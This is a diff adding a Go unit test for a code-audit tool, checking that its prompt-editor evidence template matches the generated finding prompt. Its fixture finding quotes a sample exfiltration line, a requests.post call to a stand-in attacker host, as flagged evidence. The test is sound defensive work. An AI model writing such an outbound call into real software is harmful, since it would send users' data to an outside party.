@@ -1,6 +1,7 @@
 package codeaudit
 
 import (
+	"strconv"
 	"strings"
 	"testing"
 )
@@ -34,5 +35,54 @@ func TestBuildFindingPromptUsesProvidedContextAfter(t *testing.T) {
 	got := BuildFindingPrompt(f, "cp3 evidence")
 	if !strings.Contains(got, "cp3 evidence") || strings.Contains(got, "original") {
 		t.Fatalf("prompt must use the provided contextAfter:\n%s", got)
+	}
+}
+
+// TestFindingPromptEvidenceTemplateMatchesTheGeneratedHalf pins the display
+// contract of the workbench's prompt editor: the template it appends to the
+// operator's instruction is the exact tail an audit sends, with runtime values
+// replaced by placeholders. Substituting those placeholders must reproduce the
+// generated half byte for byte, so a display cannot drift from the real prompt.
+func TestFindingPromptEvidenceTemplateMatchesTheGeneratedHalf(t *testing.T) {
+	template := FindingPromptEvidenceTemplate()
+	if !strings.HasPrefix(template, FindingPromptEvidenceMarker) {
+		t.Fatalf("template does not start at the evidence marker:\n%s", template)
+	}
+
+	f := Finding{
+		File:          "exfil.py",
+		Line:          7,
+		ContextBefore: "def send(data):",
+		CodeSnippet:   `requests.post("http://evil.example/collect")`,
+		RuleID:        "NET_001",
+		Category:      "network",
+		Severity:      SeverityHigh,
+		Description:   "outbound request",
+	}
+	substitutions := [][2]string{
+		{"{{file}}", f.File},
+		{"{{line}}", strconv.Itoa(f.Line)},
+		{"{{contextBefore}}", f.ContextBefore},
+		{"{{codeSnippet}}", f.CodeSnippet},
+		{"{{contextAfter}}", "return"},
+		{"{{ruleId}}", f.RuleID},
+		{"{{category}}", f.Category},
+		{"{{severity}}", f.Severity},
+		{"{{description}}", f.Description},
+	}
+	rendered := template
+	for _, pair := range substitutions {
+		if !strings.Contains(rendered, pair[0]) {
+			t.Fatalf("template is missing placeholder %s", pair[0])
+		}
+		rendered = strings.ReplaceAll(rendered, pair[0], pair[1])
+	}
+
+	_, tail, ok := strings.Cut(BuildFindingPrompt(f, "return"), FindingPromptEvidenceMarker)
+	if !ok {
+		t.Fatal("built-in prompt has no evidence marker")
+	}
+	if want := FindingPromptEvidenceMarker + tail; rendered != want {
+		t.Fatalf("substituted template differs from the generated half:\ngot:  %q\nwant: %q", rendered, want)
 	}
 }
